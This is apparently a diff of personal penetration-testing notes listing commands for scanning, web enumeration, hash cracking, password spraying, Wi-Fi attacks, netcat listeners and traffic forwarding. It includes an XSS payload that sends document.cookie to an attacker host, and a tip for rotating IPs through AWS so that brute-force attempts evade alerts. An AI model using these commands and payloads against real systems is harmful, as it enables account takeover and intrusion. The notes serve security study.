@@ -1,10 +1,11 @@
-**Nmap**
+## **Scanners** (Vuln,URL)
+### **Nmap**
 stealth scan -> map -sS -T4 -p- -Pn ip
 Udp scan first 100 ports -> nmap -sU -T4 -p1-100 -Pn ip
 Udp scan most used 100 ports -> nmap -sU -T4 --top-ports=100 -Pn ip
-web vhost scan -> nmap -p80 --script http-vhosts --script-args 'http-vhosts.domain=example.com,http-vhosts.file=vhosts.txt' <target> 
+web vhost scan -> nmap -p80 --script http-vhosts --script-args 'http-vhosts.domain=example.com,http-vhosts.file=vhosts.txt' {target}
 
-ipsec scan ->sudo nmap -sC -sV -vv -oA [ip] 
+**ipsec scan** ->sudo nmap -sC -sV -vv -oA [ip] 
 {
  -sV -> version detection
  -sC -> default enum script 
@@ -12,36 +13,59 @@ ipsec scan ->sudo nmap -sC -sV -vv -oA [ip]
   -sU -> udp scan
   -vv -> very verbose 
   -oA -> output all {as file !!!!}
-  
+
  }
+### **Gobuster - Enumeration of websites with wordlists**
+gobuster dir -u [URL] -w /usr/share/wordlist/dirb/common.txt -t 50
+gobuster dns -d example.thm -w /path/to/wordlist
+gobuster vhost -u http://{IP} -w vhosts.txt
+**IPsec** vhost scan-> gobuster vhost -u http://[domain name] -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 
+### **ffuf - Enumeration of websites with wordlists****
+ffuf -u [URL] -w /usr/share/wordlists/dirb/subdomains-top1iml-20000.txt -H "Host: FUZZ.[hostname/ip]" -ac
+ffuf -w vhosts.txt -u http://{IP} -H "Host: FUZZ.example.com"
+{
+-s -> show only the results that are important ! 
+-fc -> filter by http status
+-fs -> filter by response size 
+}
+### **Feroxbuster**
+feroxbuster -u http://[ip] -x php
+{
+-u -> url
+-x -> check for suffix for example php suffix
+-t -> num of threads
+}
+### **Nikto**
+Nikto is an open-source web server vulnerability scanner. It’s widely used by security professionals and penetration testers to identify misconfigurations, outdated software, and common security issues in web servers and web applications.
 
-
+nikto -h http://example.com
+### **Nuclei**
+A scanner works with templates and not only scanner which randomly guesses vuln
+nuclei -u https://example.com
+nuclei -target target.com -fr 
+-fr = follow redirectors
 **SmbClient**
 
 **SNMP Enum**
 snmp-check -> snmp-check ip -c public
 snmp-walk->  snmpwalk -v1 -c public ip
 
-**Gobuster Enum**
-gobuster dir -u [URL] -w /usr/share/wordlist/dirb/common.txt -t 50
-gobuster dns -d example.thm -w /path/to/wordlist
-gobuster vhost -u http://<IP> -w vhosts.txt
-**ipsec** vhost scan-> gobuster vhost -u http://[domain name] -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+**Team Filtration** - Tool for password spraying and user discovery recommended by the instructor
 
-**ffuf**
-ffuf -u [URL] -w /usr/share/wordlists/dirb/subdomains-top1iml-20000.txt -H "Host: FUZZ.[hostname/ip]" -ac
-ffuf -w vhosts.txt -u http://<IP> -H "Host: FUZZ.example.com"
-{
--s -> show only the results that are important ! 
--fc -> filter by http status
--fs -> filter by response size 
-}
+**Daft-hack -** Msf spray office 365 spray and ADFS spray
 
-**hash-id**
+- Fireprox Tool - **Proxy** to **AWS** getaway everytime u brute force the way in it going to rotate your ip with another ip in amazon (probably in same location to avoid the impossible travel alert)
+
+## **Hash - Crackers**
+
+### **John The Reaper - Hash Cracker with word lists**
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=sha512crypt hash.txt
+
+### **hash-id - Hash identifier**
 hashid [password]
 
-**HashCat**
+### **HashCat - Hash Cracker with word lists **
 hashcat -m [value] -a [value] [hashfile] [wordlist]
 example: sudo hashcat -m 0 -a 0 412DD4759978ACFCC81DEAB01B382403 /usr/share/wordlists/rockyou.txt
 
@@ -71,31 +95,36 @@ You need to know what type of hash you're cracking. Some common examples:
 
 -m 1000: NTLM
 
-**feroxbuster**
-feroxbuster -u http://[ip] -x php
-{
--u -> url
--x -> check for suffix for example php suffix
--t -> num of threads
-}
-**websites tools**
-cyberchef 
+![[Pasted image 20260124235825.png]]
+**NPK - Using AWS FaaS for faster cracking with cost efficient use**
+**mkpasswd - Hash Generator**
+mkpasswd -m sha-512 newpasswordhere - Generate a new password hash with a password of your choice: for new and secure systems
+
+
+**openssl**
+openssl passwd newpasswordhere -specific to making hashes to /etc/passwd  and for using on old systems
+
+### **websites tools**
+**cyberchef -Crypto actions in web interface** 
+**gtfobins - Web with vulnerabilities in linux**
 https://gtfobins.github.io/ -> a lot of linux vulnerabilities options to each command and situation 
 if got sudo to nano options etc
 
-**John The Reaper**
-john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=sha512crypt hash.txt
 
 **ftp**
 wget -r ftp://[IP] -> recursively download all the exposed files:
 
-**exiftool**
+### **exiftool - Meta
+data finder**
 metadata finder 
 exiftool [regex]
 
-**CrackMapExec**
-cme ssh [IP] -u users.txt -p '"password"'
+**CrackMapExec -Scanner for security weaknesses in environments like bad config or passwords In windows systems**
+CrackMapExec (CME) is a post-exploitation framework used in cybersecurity to assess and manage security in Windows/Active Directory environments.
+cme ssh [IP] -u users.txt -p '"password"
 
+
+**WIFI Tools**
 **Reaver**
 reaver -i [interface] -b [access point] -v
 {
@@ -107,13 +136,44 @@ reaver -i [interface] -b [access point] -v
 iw is a new nl80211 based CLI configuration utility for wireless devices
 iw [interface for example:wlan0] info
 
+
+
+
 **Curl**
 curl http://ip:5000
 
-**Nikto**
-Nikto is an open-source web server vulnerability scanner. It’s widely used by security professionals and penetration testers to identify misconfigurations, outdated software, and common security issues in web servers and web applications.
-
-nikto -h http://example.com
 
 **XSS Payload**
 cookie without httponly -> <script>var i=new Image(); i.src="http://ip/?c="+document.cookie;</script>
+
+
+
+**Linux Python Package Installing On virtual Environment**
+python3 -m venv venv
+source venv/bin/activate
+pip install requests
+יציאה מה־venv:
+deactivate
+
+
+### **Nc - Listener & Sender for Linux**
+ Nc -lvnp ip port
+ {
+ -l -> listen 
+ -n -> numeric-only IP addresses, no DNS
+ -v -> verbose {-vv very verbose}
+ -p -? port 
+ -u -> UDP Traffic listener
+ -o -> outfile the traffic
+ }
+### **Socat -Forwarder of data also for dns and udp**
+sudo socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:192.168.25.1 - UDP Traffic forwarder 
+sudo socat TCP4-LISTEN:80,fork TCP4:iptosendthedata:80 - TCP Traffic forwarder
+ - Fork - makes another process to each request
+##### **Web Server**
+python -m http.server [port] 
+
+
+### **Cred Dumping Tools**
+
+**Responder - Catching Auth Requests for hash cracking of ntlm v1/v2** 
